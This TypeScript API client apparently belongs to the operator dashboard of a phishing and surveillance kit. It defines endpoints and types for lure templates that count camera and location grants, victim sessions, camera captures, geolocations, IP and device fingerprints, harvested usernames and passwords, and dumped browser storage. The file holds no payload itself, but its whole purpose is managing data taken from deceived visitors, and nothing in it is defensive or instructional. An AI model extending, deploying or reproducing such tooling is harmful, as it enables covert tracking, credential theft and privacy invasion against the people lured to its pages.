const API = '/api'

async function fetchJson<T>(url: string): Promise<T> {
  const r = await fetch(url)
  if (!r.ok) throw new Error(`${r.status} ${r.statusText}`)
  return r.json()
}

function csrfHeaders(): HeadersInit {
  return { 'X-Requested-With': 'XMLHttpRequest' }
}

export interface Stats {
  total_captures: number
  total_locations: number
  total_ips: number
  unique_ips: number
  total_size_bytes: number
  total_size_mb: number
  first_capture: number | null
  last_capture: number | null
  total_credentials: number
  total_storage_dumps: number
}

export interface Capture {
  id: string
  session_id: string
  filename: string
  file_type: string
  file_size: number
  created_at: number
  url: string
}

export interface PaginatedCaptures {
  captures: Capture[]
  total: number
  page: number
  per_page: number
  pages: number
}

export interface Location {
  id: string
  session_id: string
  latitude: number
  longitude: number
  accuracy: number | null
  address: string | null
  created_at: number
  maps_url: string
}

export interface IpEntry {
  id: string
  session_id: string
  ip_address: string
  user_agent: string | null
  device: string | null
  browser: string | null
  os: string | null
  city: string | null
  country: string | null
  created_at: number
}

export interface IpStats {
  entries: IpEntry[]
  total: number
  unique_ips: number
  device_breakdown: Record<string, number>
  browser_breakdown: Record<string, number>
  os_breakdown: Record<string, number>
}

export interface Template {
  id: string
  name: string
  description: string | null
  total_served: number
  total_camera_grants: number
  total_location_grants: number
  created_at: number
}

export interface Session {
  id: string
  name: string
  template_id: string
  status: string
  created_at: number
}

export interface EventRow {
  id: string
  session_id: string
  event_type: string
  event_data: any
  created_at: number
}

export const api = {
  stats: () => fetchJson<Stats>(`${API}/stats`),
  captures: (page = 1, perPage = 60, sort = 'newest') =>
    fetchJson<PaginatedCaptures>(`${API}/captures?page=${page}&per_page=${perPage}&sort=${sort}`),
  deleteCapture: (id: string) => fetch(`${API}/captures/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
  deleteAllCaptures: () => fetch(`${API}/captures`, { method: 'DELETE', headers: csrfHeaders() }),
  locations: (offset = 0, limit = 200, session = '') =>
    fetchJson<Location[]>(`${API}/locations?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  ips: (offset = 0, limit = 500) => fetchJson<IpStats>(`${API}/ips?offset=${offset}&limit=${limit}`),
  templates: () => fetchJson<Template[]>(`${API}/templates`),
  events: (session = 'default', offset = 0, limit = 500) =>
    fetchJson<EventRow[]>(`${API}/events?session=${session}&offset=${offset}&limit=${limit}`),
  sessions: () => fetchJson<Session[]>(`${API}/sessions`),
  createSession: (name: string, templateId: string) =>
    fetch(`${API}/sessions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...csrfHeaders() },
      body: JSON.stringify({ name, template_id: templateId })
    }).then(r => r.json()),
  deleteSession: (id: string) => fetch(`${API}/sessions/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
  credentials: (offset = 0, limit = 200, session = '') =>
    fetchJson<Credential[]>(`${API}/credentials?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteCredential: (id: string) => fetch(`${API}/credentials/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
  deleteAllCredentials: () => fetch(`${API}/credentials`, { method: 'DELETE', headers: csrfHeaders() }),
  storage: (offset = 0, limit = 100, session = '') =>
    fetchJson<StorageDump[]>(`${API}/storage?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteStorage: (id: string) => fetch(`${API}/storage/${id}`, { method: 'DELETE', headers: csrfHeaders() }),
  deleteAllStorage: () => fetch(`${API}/storage`, { method: 'DELETE', headers: csrfHeaders() }),
}

export interface StorageDump {
  id: string
  session_id: string
  ip_address: string | null
  data: any
  created_at: number
}

export interface Credential {
  id: string
  session_id: string
  template_id: string | null
  username: string | null
  password: string | null
  email: string | null
  phone: string | null
  ip_address: string | null
  created_at: number
}
